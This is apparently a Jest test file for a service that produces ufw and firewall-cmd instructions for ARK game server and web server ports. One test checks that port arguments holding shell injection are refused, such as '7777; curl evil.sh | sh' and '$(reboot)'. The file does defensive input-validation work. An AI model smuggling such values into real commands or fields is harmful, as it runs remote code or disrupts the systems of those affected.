import { FirewallService } from './firewall.service';
import * as platformUtils from '../utils/platform.utils';

describe('FirewallService', () => {
  let service: FirewallService;

  beforeEach(() => {
    service = new FirewallService();
    jest.spyOn(platformUtils, 'getPlatform').mockReturnValue('linux');
  });

  describe('getArkServerFirewallInstructions', () => {
    it('lists the game and query ports as UDP and RCON as TCP', async () => {
      const result = await service.getArkServerFirewallInstructions(7777, '27015', 32330);

      expect(result.success).toBe(true);
      expect(result.platform).toBe('linux');
      expect(result.instructions).toContain('sudo ufw allow 7777/udp');
      expect(result.instructions).toContain('sudo ufw allow 27015/udp');
      expect(result.instructions).toContain('sudo ufw allow 32330/tcp');
      expect(result.instructions).toContain('sudo firewall-cmd --permanent --add-port=32330/tcp');
    });

    it('leaves out ports that are not set', async () => {
      const result = await service.getArkServerFirewallInstructions(7777, undefined, '');

      expect(result.success).toBe(true);
      expect(result.instructions).not.toMatch(/\/tcp/);
    });

    // The text is meant to be pasted into a root shell, so nothing but a port number goes into it.
    it.each([
      ['a game port that is not a number', '7777; curl evil.sh | sh', 27015, 32330],
      ['no game port', undefined, 27015, 32330],
      ['a query port out of range', 7777, 70000, 32330],
      ['an RCON port that is not a number', 7777, 27015, '$(reboot)']
    ])('refuses %s', async (_label, gamePort, queryPort, rconPort) => {
      const result = await service.getArkServerFirewallInstructions(gamePort, queryPort, rconPort);

      expect(result).toEqual({ success: false, platform: 'linux', error: 'Invalid port' });
    });

    it('reports the platform check failing', async () => {
      jest.spyOn(platformUtils, 'getPlatform').mockImplementation(() => { throw new Error('Unsupported platform'); });

      await expect(service.getArkServerFirewallInstructions(7777, 27015, 32330)).rejects.toThrow('Unsupported platform');
    });
  });

  describe('getWebServerFirewallInstructions', () => {
    it('lists the web port as TCP', async () => {
      const result = await service.getWebServerFirewallInstructions(8080);

      expect(result.success).toBe(true);
      expect(result.platform).toBe('linux');
      expect(result.instructions).toContain('ufw allow 8080/tcp');
      expect(result.instructions).toContain('firewall-cmd --permanent --add-port=8080/tcp');
    });

    it.each([undefined, 'abc', 0])('refuses the port %p', async port => {
      const result = await service.getWebServerFirewallInstructions(port);

      expect(result).toEqual({ success: false, platform: 'linux', error: 'Invalid port' });
    });
  });
});
